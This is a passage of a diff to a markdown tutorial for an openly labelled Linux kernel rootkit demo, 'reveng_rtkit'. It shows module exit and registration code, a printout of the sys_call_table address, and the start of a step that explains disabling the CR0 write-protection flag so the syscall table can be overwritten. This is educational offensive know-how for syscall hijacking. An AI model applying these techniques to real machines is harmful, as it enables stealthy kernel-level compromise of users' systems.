+	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", syscall_table);
 
-	        return 0;
-        }
+	return 0;
+}
 
-        // ========================== Exit Function ====================
+// ========================== Exit Function ====================
 
-        static void __exit rootkit_exit(void)
-        {
-	        printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
-	        printk(KERN_INFO "=================================================\n");
-        }
+static void __exit rootkit_exit(void)
+{
+	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
+	printk(KERN_INFO "=================================================\n");
+}
 
-        module_init(rootkit_init);
-        module_exit(rootkit_exit);
+module_init(rootkit_init);
+module_exit(rootkit_exit);
 
 
-        MODULE_LICENSE("GPL");
-        MODULE_AUTHOR("reveng007");
-        MODULE_DESCRIPTION("Demo syscall table hijaking");
-        MODULE_VERSION("1.0");
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("reveng007");
+MODULE_DESCRIPTION("Demo syscall table hijaking");
+MODULE_VERSION("1.0");
 ```
-   #### Output:
-   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true)
+#### Output:
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true)
+Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :wink:. 
 
-   Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :wink:. 
+#### Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.
 
-   #### Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.
-
-   Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.
+Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.
 
    According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):\
       _Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections._
